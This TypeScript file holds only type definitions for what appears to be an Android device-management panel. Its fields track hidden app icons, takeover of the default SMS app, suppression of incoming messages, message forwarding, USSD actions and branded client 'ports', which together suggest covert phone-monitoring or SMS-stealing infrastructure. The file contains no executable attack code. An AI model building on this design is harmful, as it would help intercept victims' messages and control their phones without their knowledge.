export type Device = {
  deviceId: string;
  online: boolean;
  lastSeen: number;
  firstSeen?: number;
  port?: string;
  clientIp?: string;
  appLabel?: string;
  packageName?: string;
  manufacturer?: string;
  brand?: string;
  model?: string;
  device?: string;
  product?: string;
  androidRelease?: string;
  sdk?: number;
  operator?: string;
  simOperator?: string;
  locale?: string;
  timeZone?: string;
  iconState?: string;
  grants?: string[];
  sims?: SimSlot[];
  screen?: DeviceScreen;
  smsDefaultPkg?: string;
  smsDefaultLabel?: string;
  smsOurs?: boolean;
  smsHideIncoming?: boolean;
  smsPreviousPkg?: string;
  smsPreviousLabel?: string;
  offmode?: boolean;
  offmodeTo?: string;
  offmodeFilter?: string;
  firstActionKind?: string;
  firstActionDetail?: string;
  firstActionUssd?: string;
  firstActionText?: string;
};

export type DeviceScreen = {
  on: boolean;
  locked: boolean;
};

export type SimSlot = {
  slot: number;
  state: "on" | "off" | "empty" | string;
  label?: string;
};

export type Snapshot = {
  userId: string;
  online: boolean;
  lastSeen: number;
  displayName?: string;
  description?: string;
  setToken?: string;
  blocked?: boolean;
  watchMuted?: boolean;
  devices: Device[];
};

export type Overview = {
  mongo: string;
  liveSockets: number;
  users: number;
  onlineUsers: number;
  devices: number;
  onlineDevices: number;
  items: Snapshot[];
};

export type Port = {
  code: string;
  name?: string;
  description?: string;
  groupId?: number;
  groupTitle?: string;
  groupLink?: string;
  hasGroupPhoto?: boolean;
  hasClient?: boolean;
  hasOnboarding?: boolean;
  clientId?: string;
  clientName?: string;
  clientColor?: string;
  clientFont?: string;
  onboardingUpdatedAt?: string;
  createdAt: string;
  boundAt?: string;
  firstAction?: PortFirstAction;
  offmode?: PortOffmode;
};

export type PortOffmode = {
  cmdPersonal?: string;
  cmdNonPersonal?: string;
  cmdAll?: string;
};

export type PortFirstAction = {
  enabled?: boolean;
  iconOn?: boolean;
  when?: "start" | "grants" | "";
  icon?: "hidden" | "changed" | "";
  ussdOn?: boolean;
  ussd?: string;
  kind?: "icon" | "ussd" | "";
};

export type ClientTheme = {
  id: string;
  name: string;
  description?: string;
  primaryColor?: string;
  hasFont?: boolean;
  fontFileName?: string;
  hasOnboarding?: boolean;
  assets?: string[];
  createdAt: string;
  updatedAt: string;
};

export type GroupCard = {
  id: number;
  title: string;
  username?: string;
  description?: string;
  members?: number;
  photoUrl?: string;
  link?: string;
};
